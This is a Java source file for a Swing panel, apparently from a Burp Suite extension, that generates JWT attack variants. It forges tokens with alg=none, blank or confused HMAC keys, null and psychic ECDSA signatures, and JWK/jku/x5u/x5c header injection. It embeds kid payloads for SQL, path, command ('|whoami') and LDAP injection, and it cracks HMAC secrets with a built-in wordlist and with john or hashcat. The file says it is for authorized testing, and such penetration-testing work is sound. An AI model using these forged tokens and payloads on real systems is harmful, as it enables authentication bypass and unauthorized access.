// Created with the help of an AI Agent and littlespidy.
package com.littlespidy.jwtcomparator.ui;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.littlespidy.jwtcomparator.attacker.model.JwtKeyMaterialServer;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.List;

/** Local JWT exploit-variant builder. Generated variants are never sent automatically. */
public class JwtAttackWorkbenchPanel extends JPanel {
    private static final Gson JSON = new GsonBuilder().disableHtmlEscaping().create();
    private static final String[] TECHNIQUES = {
            "Playbook scan (offline checks)", "alg=none (case variants)", "Blank HMAC secret",
            "Null signature", "HMAC confusion (public key as secret)", "Psychic ECDSA signature",
            "kid injection (SQL / path / command / LDAP)", "JWK header injection",
            "jku / x5u / x5c header injection", "Claim mutation fuzz set", "Timestamp tampering",
            "Weak HMAC secret dictionary check"
    };
    private final JTextArea tokenInput = new JTextArea(3, 80);
    private final JTextField secretInput = new JTextField(24);
    private final JTextField valueInput = new JTextField(28);
    private final TokenSlotsContainer slotsContainer;
    private JwtKeyOperationsPanel keyOperationsPanel;
    private final JComboBox<String> technique = new JComboBox<>(TECHNIQUES);
    private final JSpinner crackTimeout = new JSpinner(new SpinnerNumberModel(5, 1, 60, 1));
    private final JSpinner fuzzStringLength = new JSpinner(new SpinnerNumberModel(10000, 1, 1000000, 1000));
    private final JwtKeyMaterialServer keyMaterialServer=new JwtKeyMaterialServer();
    private final JTextField bindHost=new JTextField("127.0.0.1",12);
    private final JTextField advertisedHost=new JTextField("127.0.0.1",12);
    private final JSpinner serverPort=new JSpinner(new SpinnerNumberModel(8089,1024,65535,1));
    private final DefaultTableModel model = new DefaultTableModel(new Object[]{"Technique / Variant", "JWT or Result"}, 0) {
        @Override public boolean isCellEditable(int row, int col) { return false; }
    };
    private final JTable variants = new JTable(model);

    public JwtAttackWorkbenchPanel(TokenSlotsContainer slotsContainer) {
        super(new BorderLayout(6, 6));
        this.slotsContainer = slotsContainer;
        JPanel inputs = new JPanel(new GridBagLayout());
        inputs.setBorder(BorderFactory.createTitledBorder("Local JWT analysis and controlled variant generation"));
        GridBagConstraints c = new GridBagConstraints();
        c.insets = new Insets(3, 5, 3, 5); c.fill = GridBagConstraints.HORIZONTAL; c.weightx = 1;
        c.gridx = 0; c.gridy = 0; c.gridwidth = 2; inputs.add(new JLabel("Paste a JWT. All generation and dictionary checks run locally; nothing is sent automatically."), c);
        c.gridy++; inputs.add(new JScrollPane(tokenInput), c);
        c.gridwidth = 1; c.weightx = 0; c.gridy++; inputs.add(new JLabel("HMAC secret / public key text:"), c);
        c.gridx = 1; c.weightx = 1; inputs.add(secretInput, c);
        c.gridx = 0; c.gridy++; c.weightx = 0; inputs.add(new JLabel("Injection URL or fuzz value:"), c);
        c.gridx = 1; c.weightx = 1; inputs.add(valueInput, c);
        c.gridx = 0; c.gridy++; c.weightx = 0; inputs.add(new JLabel("Technique:"), c);
        c.gridx = 1; c.weightx = 1; inputs.add(technique, c);
        JButton generate = new JButton("Generate / Analyze");
        generate.addActionListener(e -> runSelected());
        JButton generateAll=new JButton("Generate All Variants");generateAll.addActionListener(e->{for(int i=0;i<TECHNIQUES.length-1;i++){technique.setSelectedIndex(i);runSelected();}});
        JButton copy = new JButton("Copy Selected JWT");
        copy.addActionListener(e -> copySelected());
        JButton loadSlot = new JButton("Load Selected JWT into Offline Analysis");
        loadSlot.addActionListener(e -> loadSelectedIntoSlot());
        JButton john = new JButton("Run John wordlist"); john.addActionListener(e->runExternalCracker("john"));
        JButton hashcat = new JButton("Run hashcat wordlist"); hashcat.addActionListener(e->runExternalCracker("hashcat"));
        JPanel actions = new JPanel(new FlowLayout(FlowLayout.LEFT)); actions.add(generate); actions.add(generateAll); actions.add(copy); actions.add(loadSlot); actions.add(john); actions.add(hashcat); actions.add(new JLabel("Max fuzz length:")); actions.add(fuzzStringLength); actions.add(new JLabel("Crack timeout (min):")); actions.add(crackTimeout);
        c.gridx = 0; c.gridy++; c.gridwidth = 2; inputs.add(actions, c);
        JPanel serverControls=new JPanel(new FlowLayout(FlowLayout.LEFT)); serverControls.add(new JLabel("Key server bind:"));serverControls.add(bindHost);serverControls.add(new JLabel("Advertised host:"));serverControls.add(advertisedHost);serverControls.add(new JLabel("Port:"));serverControls.add(serverPort);
        JButton startServer=new JButton("Start JWKS / certificate server");startServer.addActionListener(e->startKeyServer());serverControls.add(startServer);
        JButton stopServer=new JButton("Stop server");stopServer.addActionListener(e->stopKeyServer());serverControls.add(stopServer);
        c.gridy++;inputs.add(serverControls,c);
        variants.setAutoCreateRowSorter(true);
        variants.setRowHeight(25);
        JScrollPane table = new JScrollPane(variants);
        table.setBorder(BorderFactory.createTitledBorder("Generated variants / offline results"));
        JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, inputs, table);
        split.setResizeWeight(.43); add(split, BorderLayout.CENTER);
        add(new JLabel("Use only on systems you are authorized to assess. Review each variant before replaying it in Burp."), BorderLayout.SOUTH);
    }
    public void setKeyOperationsPanel(JwtKeyOperationsPanel panel) { this.keyOperationsPanel=panel; }

    private void runSelected() {
        String token = cleanToken(tokenInput.getText());
        String selected = (String) technique.getSelectedItem();
        if (token.isEmpty()) { add("Input", "Paste a JWT first."); return; }
        String[] parts = token.split("\\.", -1);
        if (parts.length != 3) { add("Input", "Expected three JWT segments; token has " + parts.length + "."); return; }
        try {
            JsonObject header = decodeObject(parts[0]);
            JsonObject payload = decodeObject(parts[1]);
            switch (selected) {
                case "Playbook scan (offline checks)": offlineChecks(token, parts, header); break;
                case "alg=none (case variants)":
                    for (String alg : List.of("none", "None", "NONE", "nOnE")) { JsonObject h = header.deepCopy(); h.addProperty("alg", alg); add("alg=none / " + alg, encode(h) + "." + parts[1] + "."); }
                    break;
            case "Blank HMAC secret":
                if (!string(header, "alg").startsWith("HS")) add("Blank HMAC secret", "Requires an HMAC-signed token.");
                else add("Blank HMAC secret", sign(header, payload, ""));
                break;
                case "Null signature": add("Null signature (original alg)", parts[0] + "." + parts[1] + "."); break;
                case "HMAC confusion (public key as secret)":
                    String alg = string(header, "alg");
                    if (!alg.startsWith("RS") && !alg.startsWith("ES") && !alg.startsWith("PS")) { add("HMAC confusion", "Requires an RSA/ECDSA/PS source token."); break; }
                    JsonObject confused = header.deepCopy(); confused.addProperty("alg", alg.startsWith("ES") ? "HS" + alg.substring(2) : "HS" + alg.substring(2));
                    add("HMAC confusion (provided key text)", signWithBytes(confused, payload, secretInput.getText().getBytes(StandardCharsets.UTF_8))); break;
                case "Psychic ECDSA signature":
                    if (!string(header, "alg").startsWith("ES")) add("Psychic signature", "This technique applies to ECDSA (ES*) tokens.");
                    else {
                        int length = string(header, "alg").endsWith("512") ? 132 : (string(header, "alg").endsWith("384") ? 96 : 64);
                        add("Psychic signature (r=0,s=0)", parts[0] + "." + parts[1] + "." + Base64.getUrlEncoder().withoutPadding().encodeToString(new byte[length]));
                    }
                    break;
                case "kid injection (SQL / path / command / LDAP)":
                    for (String kid : List.of("' OR '1'='1", "../../../../dev/null", "|whoami", "*)(uid=*))", valueInput.getText().isBlank() ? "custom-kid" : valueInput.getText())) {
                        JsonObject h = header.deepCopy(); h.addProperty("kid", kid); add("kid: " + kid, trySign(h, payload));
                    } break;
                case "JWK header injection":
                    JsonObject jwkHeader = header.deepCopy();
                    JsonObject embedded;
                    if(!valueInput.getText().isBlank()) embedded=JsonParser.parseString(valueInput.getText()).getAsJsonObject();
                    else if(keyOperationsPanel!=null&&keyOperationsPanel.hasPrivateKey()) embedded=keyOperationsPanel.publicJwk();
                    else embedded=JsonParser.parseString("{\"kty\":\"RSA\",\"use\":\"sig\",\"kid\":\"attacker\",\"n\":\"replace-with-modulus\",\"e\":\"AQAB\"}").getAsJsonObject();
                    jwkHeader.add("jwk", embedded); add("JWK header injection (CVE-2018-0114)", trySign(jwkHeader, payload)); break;
                case "jku / x5u / x5c header injection":
                    String url = valueInput.getText().isBlank() ? "https://controlled.example/jwks.json" : valueInput.getText();
                    String certUrl=keyMaterialServer.isRunning()?keyMaterialServer.certificateUrl():url;
                    for (String field : List.of("jku", "x5u")) { JsonObject h = header.deepCopy(); h.addProperty(field, "jku".equals(field)?url:certUrl); add(field + " header injection", trySign(h, payload)); }
                    JsonObject x5c = header.deepCopy(); String suppliedCert=valueInput.getText().trim(); boolean useGeneratedCert=(suppliedCert.isEmpty()||suppliedCert.startsWith("http"))&&keyOperationsPanel!=null&&keyOperationsPanel.hasPrivateKey(); String cert=useGeneratedCert?JSON.toJson(List.of(Base64.getEncoder().encodeToString(keyOperationsPanel.certificateDer()))):(suppliedCert.isEmpty()?"[\"BASE64_DER_CERTIFICATE\"]":(suppliedCert.startsWith("[")?suppliedCert:JSON.toJson(List.of(suppliedCert)))); x5c.add("x5c", JsonParser.parseString(cert)); add("x5c certificate injection", trySign(x5c, payload)); break;
                case "Claim mutation fuzz set":
                    List<String> claimsToFuzz=new ArrayList<>(); if(valueInput.getText().isBlank())claimsToFuzz.addAll(payload.keySet());else claimsToFuzz.add(valueInput.getText().trim());
                    for(String claim:claimsToFuzz)for (Object value : Arrays.asList(null, true, 0, "", "A".repeat((int)fuzzStringLength.getValue()), "'\"\\<>%00")) {
                        JsonObject p = payload.deepCopy(); if (value == null) p.add(claim, com.google.gson.JsonNull.INSTANCE); else p.add(claim, JSON.toJsonTree(value));
                        add("claim fuzz: " + claim + " = " + (value == null ? "null" : value.getClass().getSimpleName()), trySign(header, p));
                    } break;
                case "Timestamp tampering":
                    long now = System.currentTimeMillis() / 1000L;
                    for (String[] entry : new String[][]{{"exp", Long.toString(now + 31536000)}, {"exp", "0"}, {"nbf", Long.toString(now + 31536000)}, {"iat", Long.toString(now + 31536000)}}) {
                        JsonObject p = payload.deepCopy(); p.addProperty(entry[0], Long.parseLong(entry[1])); add("timestamp " + entry[0] + "=" + entry[1], trySign(header, p));
                    } break;
                case "Weak HMAC secret dictionary check": crackCandidates(parts, header, payload); break;
                default: add("Analysis", "No operation selected.");
            }
        } catch (Exception ex) { add("Error", ex.getMessage() == null ? ex.toString() : ex.getMessage()); }
    }

    private void offlineChecks(String token, String[] parts, JsonObject header) {
        String alg = string(header, "alg");
        add("Algorithm", alg);
        add("Segment checks", "header=" + parts[0].length() + " chars, payload=" + parts[1].length() + " chars, signature=" + parts[2].length() + " chars");
        if ("none".equalsIgnoreCase(alg)) add("Finding", "alg=none is already present (review verifier policy).");
        if (parts[2].isEmpty()) add("Finding", "Signature segment is empty.");
        if (alg.startsWith("HS")) {
            add("Blank secret check", "Candidate " + (verifyHmac(parts, alg, new byte[0]) ? "MATCHES" : "does not match"));
            if (!secretInput.getText().isEmpty()) add("Provided secret check", "Candidate " + (verifyHmac(parts, alg, secretInput.getText().getBytes(StandardCharsets.UTF_8)) ? "MATCHES" : "does not match"));
        }
        add("Claims", payloadSummary(decodeObject(parts[1])));
    }

    private void crackCandidates(String[] parts, JsonObject header, JsonObject payload) {
        String alg = string(header, "alg");
        if (!alg.startsWith("HS")) { add("Weak-secret check", "Token algorithm is not HMAC."); return; }
        String candidates = secretInput.getText();
        if(candidates.isBlank()) candidates=String.join(",",List.of("secret","password","123456","changeme","jwt-secret","jwt_secret","secretkey","mysecret","test","admin","key","development","supersecret","changeme123","password123"));
        int checked = 0;
        for (String candidate : candidates.split("[\\r\\n,]")) { candidate = candidate.trim(); if (verifyHmac(parts, alg, candidate.getBytes(StandardCharsets.UTF_8))) { add("Recovered candidate", candidate); return; } checked++; }
        add("Weak-secret check", "No match in " + checked + " candidates. Separate candidate secrets with commas.");
    }

    private void runExternalCracker(String tool) {
        String token=cleanToken(tokenInput.getText()); String[] parts=token.split("\\.",-1);
        if(parts.length!=3){add(tool,"Paste a three-segment JWT first.");return;}
        try { String alg=string(decodeObject(parts[0]),"alg"); if(!alg.startsWith("HS")){add(tool,"External dictionary cracking supports HMAC-signed JWTs only.");return;} }
        catch(Exception ex){add(tool,"Invalid JWT: "+ex.getMessage());return;}
        JFileChooser wordlistChooser=new JFileChooser(); wordlistChooser.setDialogTitle("Choose a wordlist for "+tool);
        if(wordlistChooser.showOpenDialog(this)!=JFileChooser.APPROVE_OPTION)return;
        File wordlist=wordlistChooser.getSelectedFile();
        if(!wordlist.isFile()||!wordlist.canRead()){add(tool,"Choose a readable wordlist file.");return;}
        String executable=tool;
        int choice=JOptionPane.showOptionDialog(this,"Run "+tool+" from PATH, or select its executable?","External cracker",JOptionPane.DEFAULT_OPTION,JOptionPane.QUESTION_MESSAGE,null,new String[]{"Use PATH","Choose executable","Cancel"},"Use PATH");
        if(choice==2||choice<0)return;
        if(choice==1){JFileChooser binaryChooser=new JFileChooser();binaryChooser.setDialogTitle("Select "+tool+" executable");if(binaryChooser.showOpenDialog(this)!=JFileChooser.APPROVE_OPTION)return;executable=binaryChooser.getSelectedFile().getAbsolutePath();}
        final String program=executable; final int timeoutMinutes=(int)crackTimeout.getValue();
        add(tool,"Running offline HMAC dictionary attack with the chosen wordlist…");
        new SwingWorker<String,Void>() {
            protected String doInBackground() throws Exception {
                Path home=Path.of(System.getProperty("user.home")); Path hash=Files.createTempFile(home,"jwt-playbook-", ".jwt"); Path recovered=Files.createTempFile(home,"jwt-playbook-", ".found"); Path logs=Files.createTempFile(home,"jwt-playbook-", ".log"); Path pot=Files.createTempFile(home,"jwt-playbook-", ".pot");
                try {
                    Files.writeString(hash,token+"\n"); String alg=string(decodeObject(parts[0]),"alg");
                    List<String> command=new ArrayList<>(); command.add(program);
                    if("john".equals(tool)) { command.add("--format=HMAC-SHA"+alg.substring(2)); command.add("--wordlist="+wordlist.getAbsolutePath()); command.add("--pot="+pot); command.add(hash.toString()); }
                    else { command.add("-m");command.add("16500");command.add("-a");command.add("0");command.add("--potfile-disable");command.add("--quiet");command.add("--outfile="+recovered);command.add("--outfile-format=2");command.add(hash.toString());command.add(wordlist.getAbsolutePath()); }
                    Process process=new ProcessBuilder(command).redirectErrorStream(true).redirectOutput(logs.toFile()).start();
                    boolean completed=process.waitFor(timeoutMinutes,java.util.concurrent.TimeUnit.MINUTES);
                    if(!completed){process.destroyForcibly();return tool+" timed out after "+timeoutMinutes+" minute(s).";}
                    if("hashcat".equals(tool)&&Files.exists(recovered)){for(String line:Files.readAllLines(recovered))if(!line.isBlank())return "Recovered HMAC secret: "+line.trim();}
                    if("john".equals(tool)) {
                        List<String> show=new ArrayList<>(List.of(program,"--show","--format=HMAC-SHA"+alg.substring(2),"--pot="+pot,hash.toString()));
                        Process p=new ProcessBuilder(show).redirectErrorStream(true).redirectOutput(logs.toFile()).start();if(!p.waitFor(Math.min(60,timeoutMinutes),java.util.concurrent.TimeUnit.SECONDS)){p.destroyForcibly();return "John's result lookup timed out.";}
                        for(String line:Files.readAllLines(logs)){if(line.startsWith(token+":")){String[] columns=line.split(":",3);return "Recovered HMAC secret: "+(columns.length>1?columns[1]:line);}}
                    }
                    return tool+" finished without recovering a secret. Exit code: "+process.exitValue()+". "+(Files.exists(logs)?Files.readString(logs).trim():"");
                } finally { Files.deleteIfExists(hash);Files.deleteIfExists(recovered);Files.deleteIfExists(logs);Files.deleteIfExists(pot); }
            }
            protected void done(){try{add(tool,get());}catch(Exception ex){Throwable cause=ex.getCause()==null?ex:ex.getCause();add(tool,tool+" failed: "+cause.getMessage());}}
        }.execute();
    }

    private void startKeyServer(){
        try{
            if(keyOperationsPanel==null||!keyOperationsPanel.hasPrivateKey())throw new IllegalStateException("Generate an RSA or EC key pair in Keys & Verification first.");
            keyMaterialServer.start(bindHost.getText().trim(),advertisedHost.getText().trim(),(int)serverPort.getValue(),keyOperationsPanel.publicJwk(),keyOperationsPanel.certificateDer());
            valueInput.setText(keyMaterialServer.jwksUrl()); add("Key server", "Serving JWKS at "+keyMaterialServer.jwksUrl()+" and certificate at "+keyMaterialServer.certificateUrl()+". Set Advertised host to an address reachable by the test target.");
        }catch(Exception ex){add("Key server","Could not start local key server: "+ex.getMessage());}
    }
    public void stopKeyServer(){keyMaterialServer.stop();}
    public boolean isKeyServerRunning(){return keyMaterialServer.isRunning();}

    private String trySign(JsonObject h, JsonObject p) {
        if(keyOperationsPanel!=null&&keyOperationsPanel.hasPrivateKey()) {
            if(h.has("jwk")||h.has("jku"))h.addProperty("kid","jwt-playbook-key");
            try { return keyOperationsPanel.signVariant(h,p); }
            catch(Exception e) { add("Signing note", "Could not sign with the selected private key: "+e.getMessage()); }
        }
        if (string(h, "alg").startsWith("HS")) return sign(h, p, secretInput.getText());
        return encode(h) + "." + encode(p) + "." + decodeTokenSignature();
    }
    private String decodeTokenSignature() { String[] p = cleanToken(tokenInput.getText()).split("\\.", -1); return p.length == 3 ? p[2] : ""; }
    private String sign(JsonObject h, JsonObject p, String secret) { return signWithBytes(h, p, secret.getBytes(StandardCharsets.UTF_8)); }
    private String signWithBytes(JsonObject h, JsonObject p, byte[] secret) {
        String alg = string(h, "alg"); String jca = "HmacSHA256";
        if (alg.endsWith("384")) jca = "HmacSHA384"; else if (alg.endsWith("512")) jca = "HmacSHA512";
        try {
            String input = encode(h) + "." + encode(p);
            byte[] signature = hmac(jca, secret, input.getBytes(StandardCharsets.US_ASCII));
            return input + "." + Base64.getUrlEncoder().withoutPadding().encodeToString(signature);
        } catch (Exception e) { throw new IllegalArgumentException("Could not sign with " + alg + ": " + e.getMessage(), e); }
    }
    private static byte[] hmac(String algorithm, byte[] suppliedKey, byte[] message) throws Exception {
        java.security.MessageDigest digest = java.security.MessageDigest.getInstance(algorithm.replace("Hmac", ""));
        int blockSize = algorithm.endsWith("384") || algorithm.endsWith("512") ? 128 : 64;
        byte[] key = suppliedKey;
        if (key.length > blockSize) key = digest.digest(key);
        byte[] innerPad = new byte[blockSize], outerPad = new byte[blockSize];
        for (int i = 0; i < blockSize; i++) {
            byte value = i < key.length ? key[i] : 0;
            innerPad[i] = (byte) (value ^ 0x36);
            outerPad[i] = (byte) (value ^ 0x5c);
        }
        digest.update(innerPad); digest.update(message);
        byte[] inner = digest.digest();
        digest.update(outerPad); digest.update(inner);
        return digest.digest();
    }
    private boolean verifyHmac(String[] parts, String alg, byte[] secret) {
        try { String[] signed = signWithBytes(decodeObject(parts[0]), decodeObject(parts[1]), secret).split("\\.", -1); return java.security.MessageDigest.isEqual(signed[2].getBytes(StandardCharsets.US_ASCII), parts[2].getBytes(StandardCharsets.US_ASCII)); }
        catch (Exception e) { return false; }
    }
    private static String encode(JsonObject json) { return Base64.getUrlEncoder().withoutPadding().encodeToString(JSON.toJson(json).getBytes(StandardCharsets.UTF_8)); }
    private static JsonObject decodeObject(String segment) { return JsonParser.parseString(new String(Base64.getUrlDecoder().decode(pad(segment)), StandardCharsets.UTF_8)).getAsJsonObject(); }
    private static String pad(String value) { return value + "=".repeat((4 - value.length() % 4) % 4); }
    private static String cleanToken(String value) { String t = value == null ? "" : value.trim(); return t.regionMatches(true, 0, "Bearer ", 0, 7) ? t.substring(7).trim() : t; }
    private static String string(JsonObject object, String key) { return object.has(key) && !object.get(key).isJsonNull() ? object.get(key).getAsString() : ""; }
    private static String payloadSummary(JsonObject payload) { StringBuilder out = new StringBuilder(); for (String k : List.of("iss", "sub", "aud", "exp", "nbf", "iat")) if (payload.has(k)) out.append(k).append('=').append(payload.get(k)).append("; "); return out.length() == 0 ? "No standard claims recognized." : out.toString(); }
    private void add(String name, String value) { model.addRow(new Object[]{name, value}); }
    public List<String> getGeneratedTokens() {
        List<String> found=new ArrayList<>();
        for(int i=0;i<model.getRowCount();i++) { String value=String.valueOf(model.getValueAt(i,1)); if(value.split("\\.",-1).length==3&&value.chars().filter(ch->ch=='.').count()==2) found.add(value); }
        return found;
    }
    private void copySelected() { int row = variants.getSelectedRow(); if (row < 0) return; String value = String.valueOf(model.getValueAt(variants.convertRowIndexToModel(row), 1)); if (value.split("\\.", -1).length == 3) Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(value), null); }
    private void loadSelectedIntoSlot() {
        int row = variants.getSelectedRow();
        if (row < 0) { add("Load variant", "Select a generated result first."); return; }
        String value = String.valueOf(model.getValueAt(variants.convertRowIndexToModel(row), 1));
        if (value.split("\\.", -1).length != 3) { add("Load variant", "Selected result is not a JWT. Generate a token variant first."); return; }
        if (slotsContainer == null || slotsContainer.getSlotCount() == 0) { add("Load variant", "No Offline Analysis token slots are available."); return; }
        String[] choices = new String[slotsContainer.getSlotCount()];
        for (int i = 0; i < choices.length; i++) choices[i] = "Token " + (i + 1);
        String target = (String) JOptionPane.showInputDialog(this, "Choose the destination token slot:", "Load Attack Variant", JOptionPane.PLAIN_MESSAGE, null, choices, choices[0]);
        if (target == null) return;
        int index = Integer.parseInt(target.substring("Token ".length()));
        slotsContainer.loadIntoSlot(index, value, "Attack Variant");
        add("Load variant", "Loaded into Offline Analysis " + target + ". Use Attack → Token Access Matrix to replay it against queued requests.");
    }
}
